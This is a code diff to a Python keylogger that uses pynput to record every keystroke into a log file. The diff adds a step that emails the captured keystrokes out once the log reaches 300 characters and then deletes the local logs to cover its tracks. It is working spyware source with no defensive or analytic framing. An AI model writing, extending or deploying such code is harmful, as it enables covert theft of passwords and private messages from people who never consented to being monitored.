@@ -1,12 +1,13 @@
 import datetime
 from pynput.keyboard import Listener
-
+from tools import len_file, delete_logs
+from start import Email
 
 buttons = ['Key.tab', 'Key.ctrl', 'Key.alt', 'Key.left', 'Key.right', 'Key.up', 'Key.down', 'Key.end', 'Key.page_down', 'Key.page_up',
            'Key.home', 'Key.end', 'Key.insert', 'Key.shift_r', 'Key.ctrt_l', 'Key.f1', 'Key.f2', 'Key.f3',
            'Key.f4', 'Key.f5', 'Key.f6', 'Key.f7', 'Key.f8', 'Key.f9', 'Key.f10', 'Key.f11', 'Key.f12', 'Key.esc']
 
-encoding = 'utf-8'
+encoding = 'UTF-8'
 
 
 class Keylogger:
@@ -14,7 +15,6 @@ class Keylogger:
         self.write_time()
 
     def on_press(self, key):
-        # print(f'{key} pressed')
         try:
             for i in buttons:
                 if str(key) == i:
@@ -26,25 +26,35 @@ class Keylogger:
             write_error(er)
 
     def write_file(self, key):
-        try:
-            with open('log.txt', 'a+', encoding=encoding) as file:
-                k = str(key).replace("'", "")
+        d = len_file()
+        if len(d) >= 300:
+            try:
+                Email().sender(d)
+                delete_logs()
+                self.write_time()
+            except Exception as er:
+                write_error(er)
 
-                if k.find("backspace") > 0:
-                    file.write('DELETE ')
+        else:
+            try:
+                with open('log.txt', 'a+', encoding=encoding) as file:
+                    k = str(key).replace("'", "")
 
-                elif k.find("space") > 0:
-                    file.write(" ")
+                    if k.find("backspace") > 0:
+                        file.write('DELETE ')
 
-                elif k.find("enter") > 0:
-                    file.write('\n')
+                    elif k.find("space") > 0:
+                        file.write(" ")
 
-                elif k.find("Key") == -1:
-                    file.write(k)
+                    elif k.find("enter") > 0:
+                        file.write('\n')
 
-                file.flush()
-        except Exception as er:
-            write_error(er)
+                    elif k.find("Key") == -1:
+                        file.write(k)
+
+                    file.flush()
+            except Exception as er:
+                write_error(er)
 
     def write_time(self):
         try:
@@ -56,7 +66,7 @@ class Keylogger:
 
 def write_error(er):
     with open('errors.txt', 'a+')as file:
-        file.write('\n' + str(datetime.datetime.now() + ':  ' + str(er)))
+        file.write('\n' + str(datetime.datetime.now()) + ':  ' + str(er))
 
 if __name__ == "__main__":
     obj = Keylogger()
